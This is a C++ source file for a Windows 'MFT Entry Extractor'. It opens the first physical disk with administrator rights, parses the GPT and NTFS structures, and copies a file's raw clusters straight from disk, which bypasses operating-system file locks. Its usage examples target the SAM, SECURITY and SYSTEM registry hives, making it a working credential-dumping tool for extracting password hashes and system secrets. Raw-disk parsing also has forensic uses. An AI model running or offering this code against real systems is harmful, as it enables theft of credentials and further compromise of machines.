#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <vector>

using namespace std;

#pragma pack(push, 1)
struct GPT_HEADER {
    BYTE Signature[8];
    DWORD Revision;
    DWORD HeaderSize;
    DWORD HeaderCRC32;
    DWORD Reserved;
    ULONGLONG CurrentLBA;
    ULONGLONG BackupLBA;
    ULONGLONG FirstUsableLBA;
    ULONGLONG LastUsableLBA;
    BYTE DiskGUID[16];
    ULONGLONG PartitionEntryLBA;
    DWORD NumberOfPartitions;
    DWORD PartitionEntrySize;
    DWORD PartitionArrayCRC32;
};

struct GPT_PARTITION_ENTRY {
    BYTE PartitionTypeGUID[16];
    BYTE UniquePartitionGUID[16];
    ULONGLONG StartingLBA;
    ULONGLONG EndingLBA;
    ULONGLONG Attributes;
    WCHAR PartitionName[36];
};

struct NTFS_BOOT_SECTOR {
    BYTE JumpInstruction[3];
    BYTE OemID[8];
    WORD BytesPerSector;
    BYTE SectorsPerCluster;
    WORD ReservedSectors;
    BYTE Unused1[3];
    WORD Unused2;
    BYTE MediaDescriptor;
    WORD Unused3;
    WORD SectorsPerTrack;
    WORD NumberOfHeads;
    DWORD HiddenSectors;
    DWORD Unused4;
    DWORD Unused5;
    ULONGLONG TotalSectors;
    ULONGLONG MFT_LCN;
    ULONGLONG MFTMirr_LCN;
    BYTE ClustersPerMFTRecord;
    BYTE Unused6[3];
    BYTE ClustersPerIndexBuffer;
    BYTE Unused7[3];
    ULONGLONG VolumeSerialNumber;
    DWORD Checksum;
    BYTE BootstrapCode[426];
    WORD EndOfSectorMarker;
};

struct MFT_ENTRY_HEADER {
    DWORD Signature;
    WORD UpdateSequenceOffset;
    WORD UpdateSequenceSize;
    ULONGLONG LSN;
    WORD SequenceNumber;
    WORD HardLinkCount;
    WORD FirstAttributeOffset;
    WORD Flags;
    DWORD RealSize;
    DWORD AllocatedSize;
    ULONGLONG BaseFileRecord;
    WORD NextAttributeID;
    WORD Unused;
    DWORD MFTRecordNumber;
};

struct ATTRIBUTE_HEADER {
    DWORD AttributeType;
    DWORD Length;
    BYTE NonResident;
    BYTE NameLength;
    WORD NameOffset;
    WORD Flags;
    WORD AttributeID;
};

struct RESIDENT_ATTRIBUTE {
    ATTRIBUTE_HEADER Header;
    DWORD ValueLength;
    WORD ValueOffset;
    BYTE IndexedFlag;
    BYTE Padding;
};

struct NON_RESIDENT_ATTRIBUTE {
    ATTRIBUTE_HEADER Header;
    ULONGLONG StartingVCN;
    ULONGLONG EndingVCN;
    WORD DataRunsOffset;
    WORD CompressionUnitSize;
    DWORD Padding;
    ULONGLONG AllocatedSize;
    ULONGLONG RealSize;
    ULONGLONG InitializedSize;
};

struct FILE_NAME_ATTRIBUTE {
    ULONGLONG ParentDirectory;
    ULONGLONG CreationTime;
    ULONGLONG ModificationTime;
    ULONGLONG MFTChangeTime;
    ULONGLONG LastAccessTime;
    ULONGLONG AllocatedSize;
    ULONGLONG RealSize;
    DWORD FileAttributes;
    DWORD ReparsePointTag;
    BYTE FileNameLength;
    BYTE NamespaceType;
    WCHAR FileName[1];
};
#pragma pack(pop)

// Globals
ULONGLONG g_BytesPerSector = 512;
ULONGLONG g_SectorsPerCluster = 0;
ULONGLONG g_CDriveStartLBA = 0;
ULONGLONG g_MFT_LCN = 0;
ULONGLONG g_ClusterSize = 0;
ULONGLONG g_MFTEntrySize = 1024;

const BYTE BASIC_DATA_GUID[16] = {
    0xA2, 0xA0, 0xD0, 0xEB, 0xE5, 0xB9, 0x33, 0x44,
    0x87, 0xC0, 0x68, 0xB6, 0xB7, 0x26, 0x99, 0xC7
};

struct DataRun {
    ULONGLONG vcn_start;
    ULONGLONG length_clusters;
    ULONGLONG absolute_lcn;
};

vector<DataRun> g_MFT_DataRuns;

bool IsGPTDisk(HANDLE hDisk) {
    BYTE mbr[512];
    LARGE_INTEGER offset;
    offset.QuadPart = 0;
    SetFilePointerEx(hDisk, offset, NULL, FILE_BEGIN);

    DWORD bytesRead;
    if (!ReadFile(hDisk, mbr, 512, &bytesRead, NULL)) {
        return false;
    }

    return (mbr[0x1C2] == 0xEE);
}

bool FindCDriveStartLBA(HANDLE hDisk) {
    BYTE gpt_header_buffer[512];
    LARGE_INTEGER offset;
    offset.QuadPart = 512;
    SetFilePointerEx(hDisk, offset, NULL, FILE_BEGIN);

    DWORD bytesRead;
    if (!ReadFile(hDisk, gpt_header_buffer, 512, &bytesRead, NULL)) {
        printf("[-] Failed to read GPT header\n");
        return false;
    }

    const GPT_HEADER* gpt = (const GPT_HEADER*)gpt_header_buffer;

    if (memcmp(gpt->Signature, "EFI PART", 8) != 0) {
        printf("[-] Invalid GPT signature\n");
        return false;
    }

    const DWORD ENTRIES_PER_SECTOR = 512 / 128;
    DWORD sectorsToRead = (gpt->NumberOfPartitions + ENTRIES_PER_SECTOR - 1) / ENTRIES_PER_SECTOR;

    for (DWORD sector = 0; sector < sectorsToRead; sector++) {
        BYTE partition_buffer[512];
        offset.QuadPart = (gpt->PartitionEntryLBA + sector) * 512;
        SetFilePointerEx(hDisk, offset, NULL, FILE_BEGIN);

        if (!ReadFile(hDisk, partition_buffer, 512, &bytesRead, NULL)) {
            continue;
        }

        for (DWORD i = 0; i < ENTRIES_PER_SECTOR; i++) {
            const GPT_PARTITION_ENTRY* entry = (const GPT_PARTITION_ENTRY*)(partition_buffer + i * 128);

            if (memcmp(entry->PartitionTypeGUID, BASIC_DATA_GUID, 16) == 0) {
                ULONGLONG size = entry->EndingLBA - entry->StartingLBA;

                if (size > 1000000) {
                    g_CDriveStartLBA = entry->StartingLBA;
                    printf("[+] Found partition at LBA %llu (%.2f GB)\n",
                        g_CDriveStartLBA, (size * 512) / (1024.0 * 1024.0 * 1024.0));
                    return true;
                }
            }
        }
    }

    printf("[-] No suitable partition found\n");
    return false;
}

bool DetectNTFSParameters(HANDLE hDisk) {
    BYTE boot_sector[512];
    LARGE_INTEGER offset;
    offset.QuadPart = g_CDriveStartLBA * 512;
    SetFilePointerEx(hDisk, offset, NULL, FILE_BEGIN);

    DWORD bytesRead;
    if (!ReadFile(hDisk, boot_sector, 512, &bytesRead, NULL)) {
        printf("[-] Failed to read boot sector\n");
        return false;
    }

    if (memcmp(boot_sector + 3, "NTFS    ", 8) != 0) {
        printf("[-] Not an NTFS partition\n");
        return false;
    }

    const NTFS_BOOT_SECTOR* bs = (const NTFS_BOOT_SECTOR*)boot_sector;

    g_SectorsPerCluster = bs->SectorsPerCluster;
    g_MFT_LCN = bs->MFT_LCN;
    g_ClusterSize = bs->BytesPerSector * g_SectorsPerCluster;

    printf("[+] NTFS detected\n");
    printf("    Cluster size: %llu bytes\n", g_ClusterSize);
    printf("    MFT LCN: %llu\n", g_MFT_LCN);

    return true;
}

void WideCharToASCII(const WCHAR* wide, char* ascii, int maxLen) {
    int i;
    for (i = 0; i < maxLen - 1 && wide[i] != 0; i++) {
        ascii[i] = (char)wide[i];
    }
    ascii[i] = '\0';
}

bool ApplyFixup(BYTE* mft_entry) {
    MFT_ENTRY_HEADER* header = (MFT_ENTRY_HEADER*)mft_entry;

    WORD usa_offset = header->UpdateSequenceOffset;
    WORD usa_size = header->UpdateSequenceSize;

    if (usa_offset == 0 || usa_size < 2 || usa_offset >= g_MFTEntrySize) {
        return false;
    }

    WORD* usa = (WORD*)(mft_entry + usa_offset);
    WORD usn = usa[0];

    int num_sectors = usa_size - 1;
    for (int i = 0; i < num_sectors; i++) {
        SIZE_T sector_end = ((i + 1) * 512) - 2;
        if (sector_end + 2 > g_MFTEntrySize) break;

        WORD* last_word = (WORD*)(mft_entry + sector_end);
        *last_word = usa[i + 1];
    }

    return true;
}

vector<DataRun> ParseDataRuns(const BYTE* data_runs, SIZE_T max_len) {
    vector<DataRun> runs;
    SIZE_T idx = 0;
    ULONGLONG vcn_cursor = 0;
    LONGLONG prev_lcn = 0;

    while (idx < max_len) {
        BYTE header = data_runs[idx];
        idx++;
        if (header == 0x00) break;

        int lengthSize = header & 0x0F;
        int offsetSize = (header >> 4) & 0x0F;

        if (lengthSize == 0 || lengthSize > 8 || offsetSize > 8) {
            break;
        }

        if (idx + lengthSize + offsetSize > max_len) {
            break;
        }

        ULONGLONG length = 0;
        for (int i = 0; i < lengthSize; i++) {
            length |= ((ULONGLONG)data_runs[idx + i]) << (8 * i);
        }
        idx += lengthSize;

        LONGLONG offset = 0;
        if (offsetSize > 0) {
            for (int i = 0; i < offsetSize; i++) {
                offset |= ((LONGLONG)data_runs[idx + i]) << (8 * i);
            }
            LONGLONG sign_bit = 1LL << (offsetSize * 8 - 1);
            if (offset & sign_bit) {
                LONGLONG mask = ((1LL << (offsetSize * 8)) - 1);
                offset = offset | (~mask);
            }
        }
        idx += offsetSize;

        LONGLONG lcn_start = prev_lcn + offset;

        DataRun r;
        r.vcn_start = vcn_cursor;
        r.length_clusters = length;
        r.absolute_lcn = lcn_start;
        runs.push_back(r);

        vcn_cursor += length;
        prev_lcn = lcn_start;
    }

    return runs;
}

bool LoadMFTDataRuns(HANDLE hDisk) {
    printf("\n[Loading MFT Data Runs]\n");

    // Read MFT entry 0 (the $MFT file itself)
    ULONGLONG mft_start_lba = g_CDriveStartLBA + (g_MFT_LCN * g_SectorsPerCluster);
    ULONGLONG byte_offset = mft_start_lba * 512;

    BYTE mft_entry[1024];
    LARGE_INTEGER offset;
    offset.QuadPart = byte_offset;
    SetFilePointerEx(hDisk, offset, NULL, FILE_BEGIN);

    DWORD bytesRead;
    if (!ReadFile(hDisk, mft_entry, 1024, &bytesRead, NULL) || bytesRead != 1024) {
        printf("[-] Failed to read MFT entry 0\n");
        return false;
    }

    // Apply fixup
    ApplyFixup(mft_entry);

    MFT_ENTRY_HEADER* header = (MFT_ENTRY_HEADER*)mft_entry;
    if (header->Signature != 0x454C4946) {
        printf("[-] Invalid MFT entry 0 signature: 0x%08X\n", header->Signature);
        return false;
    }

    printf("[+] MFT entry 0 is valid\n");

    // Find $DATA attribute
    DWORD attr_offset = header->FirstAttributeOffset;
    while (attr_offset < 1024) {
        const ATTRIBUTE_HEADER* attr = (const ATTRIBUTE_HEADER*)(mft_entry + attr_offset);

        if (attr->AttributeType == 0xFFFFFFFF || attr->Length == 0) break;

        if (attr->AttributeType == 0x80 && attr->NonResident == 1) {
            const NON_RESIDENT_ATTRIBUTE* nonres = (const NON_RESIDENT_ATTRIBUTE*)(mft_entry + attr_offset);
            const BYTE* data_runs = mft_entry + attr_offset + nonres->DataRunsOffset;

            g_MFT_DataRuns = ParseDataRuns(data_runs, 1024 - (attr_offset + nonres->DataRunsOffset));

            printf("[+] Found %zu MFT data run(s):\n", g_MFT_DataRuns.size());
            for (size_t i = 0; i < g_MFT_DataRuns.size(); i++) {
                printf("    Run #%zu: VCN=%llu, LCN=%llu, Length=%llu clusters\n",
                    i + 1, g_MFT_DataRuns[i].vcn_start, g_MFT_DataRuns[i].absolute_lcn,
                    g_MFT_DataRuns[i].length_clusters);
            }

            return true;
        }

        attr_offset += attr->Length;
    }

    printf("[-] $DATA attribute not found in MFT entry 0\n");
    return false;
}

bool ReadMFTEntryFragmented(HANDLE hDisk, ULONGLONG entry_number, BYTE* mft_entry) {
    // Calculate which VCN this entry is in
    ULONGLONG byte_offset_in_mft = entry_number * g_MFTEntrySize;
    ULONGLONG vcn = byte_offset_in_mft / g_ClusterSize;
    ULONGLONG offset_in_cluster = byte_offset_in_mft % g_ClusterSize;

    // Find the data run that contains this VCN
    for (size_t i = 0; i < g_MFT_DataRuns.size(); i++) {
        const DataRun& run = g_MFT_DataRuns[i];
        ULONGLONG vcn_end = run.vcn_start + run.length_clusters;

        if (vcn >= run.vcn_start && vcn < vcn_end) {
            // Found the right run
            ULONGLONG vcn_offset = vcn - run.vcn_start;
            ULONGLONG lcn = run.absolute_lcn + vcn_offset;
            ULONGLONG physical_lba = g_CDriveStartLBA + (lcn * g_SectorsPerCluster);
            ULONGLONG physical_offset = (physical_lba * 512) + offset_in_cluster;

            LARGE_INTEGER offset;
            offset.QuadPart = physical_offset;
            SetFilePointerEx(hDisk, offset, NULL, FILE_BEGIN);

            DWORD bytesRead;
            if (!ReadFile(hDisk, mft_entry, (DWORD)g_MFTEntrySize, &bytesRead, NULL)) {
                return false;
            }

            return (bytesRead == g_MFTEntrySize);
        }
    }

    printf("[-] VCN %llu not found in MFT data runs\n", vcn);
    return false;
}

bool ExtractFile(HANDLE hDisk, ULONGLONG entry_number, const char* output_filename) {
    printf("\n[Extracting File from MFT Entry %llu]\n", entry_number);

    BYTE mft_entry[1024];
    if (!ReadMFTEntryFragmented(hDisk, entry_number, mft_entry)) {
        printf("[-] Failed to read MFT entry\n");
        return false;
    }

    // Apply fixup
    ApplyFixup(mft_entry);

    MFT_ENTRY_HEADER* header = (MFT_ENTRY_HEADER*)mft_entry;

    if (header->Signature != 0x454C4946) {
        printf("[-] Invalid MFT signature: 0x%08X (expected 0x454C4946)\n", header->Signature);
        return false;
    }

    printf("[+] Valid MFT entry\n");

    // Find $DATA attribute
    DWORD offset = header->FirstAttributeOffset;

    while (offset < 1024 && offset > 0) {
        const ATTRIBUTE_HEADER* attr = (const ATTRIBUTE_HEADER*)(mft_entry + offset);

        if (attr->AttributeType == 0xFFFFFFFF || attr->Length == 0) break;

        if (attr->AttributeType == 0x80) {
            printf("[+] Found $DATA attribute\n");

            if (attr->NonResident == 1) {
                const NON_RESIDENT_ATTRIBUTE* nonres_attr = (const NON_RESIDENT_ATTRIBUTE*)(mft_entry + offset);

                ULONGLONG real_size = nonres_attr->RealSize;
                ULONGLONG allocated_size = nonres_attr->AllocatedSize;

                printf("    File size: %llu bytes (%.2f KB)\n", real_size, real_size / 1024.0);
                printf("    Allocated: %llu bytes\n", allocated_size);

                const BYTE* data_runs = mft_entry + offset + nonres_attr->DataRunsOffset;
                vector<DataRun> runs = ParseDataRuns(data_runs, 1024 - (offset + nonres_attr->DataRunsOffset));

                if (runs.empty()) {
                    printf("[-] No data runs found\n");
                    return false;
                }

                printf("    Found %zu data run(s)\n", runs.size());

                BYTE* file_buffer = (BYTE*)malloc((size_t)allocated_size);
                if (!file_buffer) {
                    printf("[-] Failed to allocate memory\n");
                    return false;
                }

                ULONGLONG buffer_offset = 0;

                for (size_t i = 0; i < runs.size(); i++) {
                    ULONGLONG lcn = runs[i].absolute_lcn;
                    ULONGLONG num_clusters = runs[i].length_clusters;
                    ULONGLONG cluster_bytes = num_clusters * g_ClusterSize;

                    printf("    Run #%zu: LCN=%llu, Length=%llu clusters (%llu bytes)\n",
                        i + 1, lcn, num_clusters, cluster_bytes);

                    ULONGLONG physical_lba = g_CDriveStartLBA + (lcn * g_SectorsPerCluster);
                    ULONGLONG physical_offset = physical_lba * g_BytesPerSector;

                    LARGE_INTEGER seek_offset;
                    seek_offset.QuadPart = physical_offset;

                    if (!SetFilePointerEx(hDisk, seek_offset, NULL, FILE_BEGIN)) {
                        printf("    [-] Failed to seek\n");
                        free(file_buffer);
                        return false;
                    }

                    DWORD bytes_to_read = (DWORD)cluster_bytes;
                    DWORD bytes_read = 0;

                    if (!ReadFile(hDisk, file_buffer + buffer_offset, bytes_to_read, &bytes_read, NULL)) {
                        printf("    [-] Failed to read\n");
                        free(file_buffer);
                        return false;
                    }

                    buffer_offset += bytes_read;
                }

                FILE* out = fopen(output_filename, "wb");
                if (!out) {
                    printf("[-] Failed to create output file\n");
                    free(file_buffer);
                    return false;
                }

                fwrite(file_buffer, 1, (size_t)real_size, out);
                fclose(out);
                free(file_buffer);

                printf("\n[SUCCESS] Saved to %s (%llu bytes)\n", output_filename, real_size);
                return true;
            }
            else {
                // Resident file
                const RESIDENT_ATTRIBUTE* res_attr = (const RESIDENT_ATTRIBUTE*)(mft_entry + offset);
                DWORD value_len = res_attr->ValueLength;
                const BYTE* data = mft_entry + offset + res_attr->ValueOffset;

                FILE* out = fopen(output_filename, "wb");
                if (!out) {
                    printf("[-] Failed to create output file\n");
                    return false;
                }

                fwrite(data, 1, value_len, out);
                fclose(out);

                printf("\n[SUCCESS] Saved to %s (%u bytes, resident)\n", output_filename, value_len);
                return true;
            }
        }

        offset += attr->Length;
    }

    printf("[-] $DATA attribute not found\n");
    return false;
}

int main(int argc, char* argv[]) {
    printf("==============================================\n");
    printf("  MFT Entry Extractor (Fragmentation Support)\n");
    printf("  Handles fragmented MFT\n");
    printf("==============================================\n\n");

    if (argc < 3) {
        printf("Usage: %s <mft_entry_number> <output_filename>\n\n", argv[0]);
        printf("Examples:\n");
        printf("  %s 924993 SAM.bin\n", argv[0]);
        printf("  %s 924994 SECURITY.bin\n", argv[0]);
        printf("  %s 924996 SYSTEM.bin\n\n", argv[0]);
        return 1;
    }

    ULONGLONG entry_number = strtoull(argv[1], NULL, 10);
    const char* output_filename = argv[2];

    printf("[*] Target MFT Entry: %llu\n", entry_number);
    printf("[*] Output File: %s\n\n", output_filename);

    // Open physical disk
    HANDLE hDisk = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
        OPEN_EXISTING, 0, NULL);

    if (hDisk == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open PhysicalDrive0\n");
        printf("[-] Make sure to run as Administrator!\n");
        return 1;
    }

    printf("[+] Opened PhysicalDrive0\n");

    // Check if GPT
    if (!IsGPTDisk(hDisk)) {
        printf("[-] Not a GPT disk\n");
        CloseHandle(hDisk);
        return 1;
    }
    printf("[+] GPT disk detected\n\n");

    // Find C: drive
    if (!FindCDriveStartLBA(hDisk)) {
        CloseHandle(hDisk);
        return 1;
    }

    // Detect NTFS
    if (!DetectNTFSParameters(hDisk)) {
        CloseHandle(hDisk);
        return 1;
    }

    // Load MFT data runs
    if (!LoadMFTDataRuns(hDisk)) {
        CloseHandle(hDisk);
        return 1;
    }

    // Extract the file
    bool success = ExtractFile(hDisk, entry_number, output_filename);

    CloseHandle(hDisk);

    if (success) {
        printf("\n[DONE] Extraction completed successfully!\n");
        return 0;
    }
    else {
        printf("\n[FAILED] Extraction failed\n");
        return 1;
    }
}
